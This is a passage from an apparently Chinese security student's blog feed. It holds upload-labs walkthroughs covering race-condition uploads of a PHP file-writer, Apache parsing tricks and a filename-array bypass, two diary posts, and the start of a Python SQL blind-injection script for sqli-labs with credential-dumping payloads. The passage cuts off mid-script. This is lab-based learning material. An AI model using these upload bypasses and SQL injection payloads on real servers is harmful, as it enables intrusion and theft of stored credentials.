class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Something\&#x27;s wrong&#x27;</span>);<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$unlink</span> = <span class="hljs-literal">FALSE</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$correctImage</span>;<br>        file_put_contents(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">TRUE</span>;<br>        imagecreatefromjpeg(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$unlink</span>)<br>            unlink(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$correctImage</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">custom_error_handler</span>(<span class="hljs-params"><span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$errfile</span>, <span class="hljs-variable">$errline</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$extraBytes</span>, <span class="hljs-variable">$correctImage</span>;<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">FALSE</span>;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$m</span>)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>])) &#123;<br>                <span class="hljs-variable">$extraBytes</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>];<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataInputStream</span> </span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$binData</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$order</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$size</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$order</span> = <span class="hljs-literal">false</span>, <span class="hljs-variable">$fromString</span> = <span class="hljs-literal">false</span></span>) </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;binData = <span class="hljs-string">&#x27;&#x27;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;order = <span class="hljs-variable">$order</span>;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$fromString</span>) &#123;<br>                <span class="hljs-keyword">if</span>(!file_exists(<span class="hljs-variable">$filename</span>) || !is_file(<span class="hljs-variable">$filename</span>))<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;File not exists [&#x27;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&#x27;]&#x27;</span>);<br>                <span class="hljs-keyword">$this</span>-&gt;binData = file_get_contents(<span class="hljs-variable">$filename</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">$this</span>-&gt;binData = <span class="hljs-variable">$filename</span>;<br>            &#125;<br>            <span class="hljs-keyword">$this</span>-&gt;size = strlen(<span class="hljs-keyword">$this</span>-&gt;binData);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">seek</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-keyword">$this</span>-&gt;size - strlen(<span class="hljs-keyword">$this</span>-&gt;binData));<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">skip</span>(<span class="hljs-params"><span class="hljs-variable">$skip</span></span>) </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;binData = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-variable">$skip</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readByte</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;eof()) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);<br>            &#125;<br>            <span class="hljs-variable">$byte</span> = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">$this</span>-&gt;binData = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">return</span> ord(<span class="hljs-variable">$byte</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readShort</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span>(strlen(<span class="hljs-keyword">$this</span>-&gt;binData) &lt; <span class="hljs-number">2</span>) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);<br>            &#125;<br>            <span class="hljs-variable">$short</span> = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>);<br>            <span class="hljs-keyword">$this</span>-&gt;binData = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">2</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;order) &#123;<br>                <span class="hljs-variable">$short</span> = (ord(<span class="hljs-variable">$short</span>[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span>) + ord(<span class="hljs-variable">$short</span>[<span class="hljs-number">0</span>]);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$short</span> = (ord(<span class="hljs-variable">$short</span>[<span class="hljs-number">0</span>]) &lt;&lt; <span class="hljs-number">8</span>) + ord(<span class="hljs-variable">$short</span>[<span class="hljs-number">1</span>]);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$short</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eof</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> !<span class="hljs-keyword">$this</span>-&gt;binData||(strlen(<span class="hljs-keyword">$this</span>-&gt;binData) === <span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="18–条件竞争-1"><a href="#18–条件竞争-1" class="headerlink" title="18–条件竞争(1)"></a>18–条件竞争(1)</h3><p>所谓条件竞争漏洞，是一种服务器端的漏洞，由于服务器端在处理不同的请求时是并发进行的，因此如果并发处理不当或相关操作顺序设计的不合理时，将会导致此类问题的发生。</p><p>参考：<a href="http://www.javashuo.com/article/p-shhvqipp-kb.html">http://www.javashuo.com/article/p-shhvqipp-kb.html</a></p><p>18关源码</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220221210214.png"></p><p>从源码可以看出，在上传图片后，该图片会直接先在服务器端储存，接着再进行检查，如果不符合条件则再删除该图片。那么我们只需要再服务器储存木马文件后，在其被删除之前访问即可触发php代码的执行。若是我们上传的php的功能是创建另一个php木马文件，那我们成功访问该文件后，就会生成一个一句话木马，以此来获得<code>webshell</code>。<strong>用多个线程上传文件，同时用多个线程访问上传后的文件，这样就存在竞争，就有可能在删除以前执行我们上传的文件。</strong></p><p>具体操作如下：</p><p>先上传包含如下代码的php文件，同时用bp抓取该数据包</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$f</span>=fopen(<span class="hljs-string">&quot;info.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>);<br>fputs(<span class="hljs-variable">$f</span>,<span class="hljs-string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//该代码功能为创建一个名为info.php的文件，该文件包含了phpinfo()函数</span><br></code></pre></div></td></tr></table></figure><p>把该数据包放到<code>intruder</code>模块</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220220162747.png"></p><p>然后清除所有变量，设置相关payload，因为我们不需要爆破某个参数，只需要不停发包即可。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220220163030.png"></p><p>然后点击<code>start attack</code></p><p>同时抓取访问该php文件的数据包，重复上述步骤，这样即形成了不停上传php文件又不停地访问该php文件的动作，就有机会在该文件删除前访问并执行一次php代码，达成创建php木马的目的</p><p>也可以只用bp发送上传的数据包，重新用另一个浏览器手动访问该文件，不停刷新即可，实际上我就是这样才成功的，同时用bp发送这两个数据包反而都没用成功。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220220165421.png"></p><p>不停访问我们上传的php文件直至成功。</p><p>此时服务器已执行了我们的php代码，创建了<code>info.php</code>文件</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220220165505.png"></p><p>成功访问<code>info.php</code></p><h3 id="19–条件竞争-2"><a href="#19–条件竞争-2" class="headerlink" title="19–条件竞争(2)"></a>19–条件竞争(2)</h3><p>注意：这关的文件上传路径有点问题，上传的文件会上传到网站根目录。建议按以下方式修改19关文件夹中的<code>myuoload.php</code>，重启服务后生效。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220227141931.png"></p><p>19关源码关键处</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220227141420.png"></p><p>这关上传文件后，会先对文件进行一系列检查。接着储存文件，然后对文件重命名。</p><p>另外我看到网上很多教程说上传图片马然后利用文件包含漏洞…然而我个人认为这跟条件竞争一点关系都没有，只是重复了前面卡的步骤。<strong>我个人认为下图的过关方法是错误的</strong></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220227144546.png"></p><p>网上许多关于这关的教程都是这样。首先这关没有说能使用文件包含漏洞，其次是上传图片马也只需要发包一次就行了，服务器也不会拦截，重命名对原本就是<code>jpg</code>形式的图片马也没有任何影响。这关本意应该是条件竞争，即在文件重命名前访问该文件。</p><p>思路仍然应该是不停上传<code>php</code>文件，然后在其被重命名为前访问该文件使其php代码生效。</p><p>该<code>php</code>文件同上一关，原理不再赘述。</p><p>这关的问题是上传后缀为php的文件的话会被拦截。我们只能根据白名单上传白名单内的文件，但又需要我们访问该文件时服务器能把其当作<code>php</code>文件解析。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220227145820.png"></p><p>这里就利用了之前用到过的apache解析漏洞(需要注意修改配置文件<code>httpd_conf</code>)</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220227150807.png"></p><p>因为apache不能解析白名单中的<code>7z</code>，所以我们可以上传<code>xx.php.7z</code>,该文件能成功上传，同时我们需要在其被重命名前访问一次。如果我们在其重命名前访问到了该文件，那么该文件会按php解析，执行php代码后产生一个新的php后门文件。</p><p>我本意觉得如果不停发送上传数据包的话我的虚拟机可能会被上传的大量文件弄得很卡，于是先尝试用bp不停重复发送访问该文件的数据包，同时手动上传一次这个文件，结果没能成功。</p><p>所以接下来我还是发送大量上传数据包，同时不停刷新浏览器来尝试访问该文件。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220227155738.png"></p><p>最终成功执行了一次php代码，服务器生成了另一个新的php文件。同时也看到了一个原上传文件。这是因为我们成功访该文件使其被占用，暂时不能进行重命名。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220227155931.png"></p><p>当我们停止访问，原上传文件被删除。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220227160322.png"></p><p>最后访问…/info.php验证,成功。</p><h3 id="20–多种方法"><a href="#20–多种方法" class="headerlink" title="20–多种方法"></a>20–多种方法</h3><p>个人觉得这关用来总结和复习很适合,因为漏洞似乎都是前面遇到过的，仔细看源码，就能发现。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220221224321.png"></p><p>大致思路是抓取数据包，修改<code>save_name</code>这个参数。</p><p>从正常角度来想，怎么也要重点关注<code>save_name</code>这个参数。可发现<code>save_name</code>用来拼接其它参数，来得到一串地址，再把该文件移动到该地址处。这就与之前的上传路径可控时用的<code>%00</code>截断是一个情况，所以此处也可以使用该方法。注意需php版本小于5.3。</p><p>另一个容易注意到的是这关使用了<code>parhinfo</code>函数来截取文件后缀后，直接进行黑名单匹配。而我们之前所做过的黑名单匹配的关卡中，在截取了后缀之后都有好几个检查的函数，用来去除空格，点，全转小写等等，这样才来匹配黑名单。所以我们可以针对黑名单漏洞还可以上传后缀为php，后缀加<code>.</code>，后缀加空格，加<code>::$data</code>等方法来绕过。</p><h3 id="21–ctf题型数组绕过"><a href="#21–ctf题型数组绕过" class="headerlink" title="21–ctf题型数组绕过"></a>21–ctf题型数组绕过</h3><p>先看源码</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220227172326.png"></p><p>可以看到有个检查MIME，这是第二关的内容，很容易绕过。</p><p>接下来是很多个新函数，网上搜一下便可知道作用是什么。这里源码也不复杂，一定要读懂源码。</p><p>从源码上看，若我们上传的文件名不是数组的形式，则会被<code>.</code>分成数组的形式。比如说正常情况下，用户上传了<code>cat.jpg</code>格式的文件，这里<code>.</code>前面的<code>cat</code>作为一个数组的第一个元素,<code>.</code>分割的<code>jpg</code>作为数组第二个元素。关于文件的最终命名形式的代码在这一行：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220227173442.png"></p><p>意思为得到该数组的第一个元素+<code>.</code>+该数组下标为（元素个数-1）的元素（正常情况下即最后一个元素），以此作为文件名来储存。</p><p>最开始我想尝试%00截断，因为涉及到了文件路径移动，并且其拼接参数可控，但最终无果。因为这里拼接的方式是取一头一尾，所以类似<code>xx.php%00.jpg</code>的形式的文件名会被分成三个元素，再去除头尾拼接，变为<code>xx.jpg</code>，没有作用。</p><p>同理想构造特殊的文件名来绕过也不行，必须保证结尾是<code>.jpg</code>来通过白名单，但最终拼接的时候也是取这个结尾来形成文件后缀。</p><p>这关的突破点在下图中</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220227174558.png"></p><p>首先是如果上传的文件名就是数组的形式的话，那么我们的这个数组的元素形式就不一定要按照每一个<code>.</code>来分元素，变数就多了。</p><p>其次是源码中两次取数组中最后一个元素的操作不同。一个是用了函数<code>end()</code>,一个是用了函数<code>count()</code>。<code>end()</code>返回数组中最后一个元素，而<code>count()</code>是返回数组元素的个数。这里是通过返回值-1取下标来得到最后一个元素。正常情况下效果是一样的，但这么多花费些功夫，也许其中就藏有玄机。</p><p>以下为破解过程(MIME部分略)：</p><p>在上传文件的数据包中复制一份有关接收<code>save_name</code>参数的数据，并在其后分别加上下标<code>[0]</code>和<code>[2]</code></p><p>并在第一段后设置文件名为<code>xx.php</code>,第二段后设置为<code>jpg</code>。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220227192902.png"></p><p>这样做的目的是使得我们的文件名变成了<code>info.php</code>+<code>空</code>+<code>.jpg</code></p><p>所以<code>reset($file)</code>返回值为<code>info.php</code>，<code>end($file)</code>获取的是<code>.jpg</code>，能够通过白名单，而<code>count($file)</code>返回的值是2，<code>$file[(count)-1]</code></p><p>返回的值是<code>$file[1]</code>，即为空。</p><p>所以最后的<code>$file_name</code>拼接后变成了<code>info.php.</code>，根据Windows特性末尾的<code>.</code>被忽略，解析时被当作php文件处理。</p><p>上传成功，复制图片地址访问，成功解析。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220227191647.png"></p><hr><p>完结 : )🐣</p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>网安</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web安全</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>清理文件</title>
    <link href="/2021/10/26/%E6%B8%85%E7%90%86%E6%96%87%E4%BB%B6/"/>
    <url>/2021/10/26/%E6%B8%85%E7%90%86%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p>昨天清理文件的时候看到这个笑死了🤣。</p><span id="more"></span><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211025170527.png"></p><p>（这个文件名是jxbrower）</p><p>这个博主说的很有道理。因为我也把这个文件删了，而且没事。</p><p>这个貌似是burp的缓存文件，博主90G而我只有30G，是不是顺便说明了我学web对比别人划2/3的水啊🤨</p><p>顺便推荐一个清理软件的神器，叫spacesniffer,能清楚形象的看出电脑硬盘的使用情况，软件大小还不到3M。</p><p>效果图（运行过程是动态的，速度很快，界面也蛮酷炫的）：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211026222539.png"></p><p>这个双十一整个1t的机械硬盘，不想再折磨512的G的自带硬盘了..</p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
      <category>好笑</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>懒狗的自责</title>
    <link href="/2021/10/20/%E6%87%92%E7%8B%97%E7%9A%84%E8%87%AA%E8%B4%A3/"/>
    <url>/2021/10/20/%E6%87%92%E7%8B%97%E7%9A%84%E8%87%AA%E8%B4%A3/</url>
    
    <content type="html"><![CDATA[<p>永远不要失去从头再来的勇气。</p><span id="more"></span><p>今朝有酒今朝醉是我，</p><p>三更灯火五更鸡也是我。</p><p>消极时是无垠宇宙浸入了我，浩瀚而虚无。</p><p>积极时是晚秋的凉风吹拂了我，寒冷而清醒。</p><p>为啥是晚秋，因为今天是2021年10月20日，刚看了下24节气，再过几天是霜降。努力不需要过多的修饰，就是脚踏实地好好吃饭。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/1634742030776.jpeg"></p><p>—图源自电影《返老还童》</p><p>巧的是这也是我曾唯一给那个最喜欢的女孩子推荐过的电影。</p><p>这几天我也每晚呆在实验室（就目前那个“实验室”的作用就是一个自习室，叫实验室挺高端的），也熬夜玩手机到一点，期待RNG的世界赛取到好成绩（老皇杂了…这次世界赛可能是RNG和李哥的最后一年）在大学过了一年多了，也很是感谢我遇到的很多温柔且善良的人，我哥要结婚了希望他们能长长久久恩恩爱爱。。</p><p>这才叫碎碎念嘛，蛮对的起我起的分类名的。之前还担心有朋友会看，写的蛮拘束的。🤣实属多虑了。</p><p>我也不喜欢自怨自艾，但这么说出来一大推废话也轻松了许多，真正太负能量的还得靠自己强大，才能自己消化掉。</p><p>其实发这一篇主要就是想试试我还会发博客不，太久没发了。。</p><p>以后尽量常更新！记录自己的学习！</p><p>没事也可以发点废话检查一下自己的精神状态😁</p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
      <category>不好笑</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>大一暑假的牢骚</title>
    <link href="/2021/07/26/%E5%A4%A7%E4%B8%80%E6%9A%91%E5%81%87%E7%9A%84%E7%89%A2%E9%AA%9A/"/>
    <url>/2021/07/26/%E5%A4%A7%E4%B8%80%E6%9A%91%E5%81%87%E7%9A%84%E7%89%A2%E9%AA%9A/</url>
    
    <content type="html"><![CDATA[<p>艹！怎么过了半个月了！</p><span id="more"></span><p>虽说早有预料到自己暑假恐怕又是无所事事混吃等死，可我这次，艹，势必不成功便成仁！</p><p>我写博客记录自己的学习经历，生活的趣事，是想用来督促我自己，让自己不要浪费生命，要活得精彩一些。</p><p>距离上次写技术文都好久了…长期一直在写的sqli labs的文章进度也保持稳定龟速…</p><p> 我也不喜欢写那些玩的事…玩是好玩，没必要写文章扯什么感悟折磨自己，而单纯的记录好傻哦，我怎么记嘛…不过玩的这几天，我也不后悔，以后还是得玩啊啊哈哈哈。</p><p>冲冲冲</p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
      <category>不好笑</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>用python编写一个sql注入脚本</title>
    <link href="/2021/06/16/py_sql%E6%B3%A8%E5%85%A5%E8%84%9A%E6%9C%AC/"/>
    <url>/2021/06/16/py_sql%E6%B3%A8%E5%85%A5%E8%84%9A%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<p>现在我已经会print（”hello world”）了，下面让我们来试一下用python写一个sql注入的脚本吧！</p><p>（针对sqli-labs8~10关）</p><span id="more"></span><p>不久前做到sqli-labs第八关盲注，这关如果纯手工注入的话十分费时。所以先来学学怎么写个sql注入的自动化脚本。</p><p><em>首先感谢这位老哥的博客，给了我很多帮助[<a href="https://uuzdaisuki.com/"> <strong>Leticia’s Blog</strong> </a>]</em></p><hr><h4 id="sql盲注命令"><a href="#sql盲注命令" class="headerlink" title="sql盲注命令"></a>sql盲注命令</h4><p><em>以下关于命令的部分内容截取自</em></p><p><em><a href="https://www.w3school.com.cn/sql/sql_functions.asp">SQL 函数 (w3school.com.cn)</a></em></p><p><em><a href="https://my.oschina.net/zz006/blog/810112">sql中substr与substring函数用法 - 周大壮 - OSCHINA - 中文开源技术交流社区</a></em></p><ul><li><p>用来截取字符串的函数：</p><ul><li><strong><code>mid()</code></strong>    </li></ul><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> MID(<span class="hljs-built_in">column_name</span>,<span class="hljs-keyword">start</span>[,length]) <span class="hljs-keyword">FROM</span> <span class="hljs-built_in">table_name</span><br></code></pre></div></td></tr></table></figure><table><thead><tr><th align="center">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">column_name</td><td align="left">必需。要提取字符的字段。</td></tr><tr><td align="center">start</td><td align="left">必需。规定开始位置（起始值是 1）。</td></tr><tr><td align="center">length</td><td align="left">可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。</td></tr></tbody></table><p>如：</p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">mid</span><span class="hljs-params">(database()</span></span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br><span class="hljs-comment">//返回数据库第一位</span><br><span class="hljs-function"><span class="hljs-title">mid</span><span class="hljs-params">(database()</span></span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;a&#x27;</span><br><span class="hljs-comment">//返回数据库名的第一位并与a的ascii作比较。</span><br></code></pre></div></td></tr></table></figure><ul><li><strong><code>substr()</code>和<code>substring()</code></strong></li></ul><figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">substr(<span class="hljs-keyword">string</span>,<span class="hljs-built_in">start</span>,<span class="hljs-built_in">length</span>)<br>substr(<span class="hljs-keyword">string</span>, <span class="hljs-built_in">start</span>, <span class="hljs-built_in">length</span>)<br></code></pre></div></td></tr></table></figure><p>string - 指定的要截取的字符串。<br>start - 必需，规定在字符串的何处开始。<br>正数 - 在字符串的指定位置开始<br>负数 - 在从字符串结尾的指定位置开始<br>0 - 在字符串中的第一个字符处开始<br>length - 指定要截取的字符串长度</p><p>可以看出用法同mid()类似</p><p>如：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">substr(database(),<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;a&#x27;</span><br>//返回数据库的第二位，然后与a的<span class="hljs-built_in">ascii</span>值比较<br>substr((SELECT table_name <span class="hljs-keyword">from</span> information_schema.tables where table_schema=text LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;a&#x27;</span><br>//查找test数据库的第一个表名并提取表名的第一位,然后与a的<span class="hljs-built_in">ascii</span>值作比较。<br></code></pre></div></td></tr></table></figure><ul><li><p><code>left()</code></p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">left</span><span class="hljs-params">(string,n)</span></span><br></code></pre></div></td></tr></table></figure><p>string ： 必要参数，要截取的字符串。</p><p>n : 必要参数，规定截取的长度，从1开始。</p><p>如：</p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">left</span><span class="hljs-params">(database()</span></span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;a&#x27;</span><br><span class="hljs-comment">//查看数据库名的第一位并和a的ascii作比较</span><br></code></pre></div></td></tr></table></figure></li></ul></li><li><p>用来针对基于时间的盲注的函数：</p><ul><li><p><code>sleep()</code></p><figure class="highlight isbl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">sleep</span></span>(<span class="hljs-variable">seconds</span>)</span><br></code></pre></div></td></tr></table></figure><p>seconds ： 必要参数，延迟的秒数。</p><figure class="highlight lisp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs lisp">if(<span class="hljs-name">ascii</span>(<span class="hljs-name">substr</span>(<span class="hljs-name">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;&#x27;a&#x27;,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">5</span>))#<br></code></pre></div></td></tr></table></figure><p>检测数据库的第一个字符的ascii值，再与a的ascii比较，如果浏览器直接显示，说明比a大，如果浏览器五秒后才显示，说明比a小</p></li></ul></li></ul><h4 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h4><ul><li><p>安装request库</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">pip install request<br><span class="hljs-regexp">//</span>win <span class="hljs-number">10</span>下 win+r 输入cmd 运行<br></code></pre></div></td></tr></table></figure></li><li><p>代码实现</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># author: eggs</span><br><br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment">#payload:</span><br><span class="hljs-comment"># select group_concat(schema_name) from information_schema.schemata</span><br><span class="hljs-comment"># select group_concat(table_name) from information_schema.tables where table_schema=&#x27;  &#x27;</span><br><span class="hljs-comment"># select group_concat(column_name) from information_schema.columns where table_schema=&#x27;  &#x27;and table_name=&#x27;  &#x27;</span><br><span class="hljs-comment"># select  1,2, group_concat(concat_ws(&#x27;~&#x27;,password,username)) from security.users %23</span><br>dic = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz,_ 0123456789()&#x27;</span><span 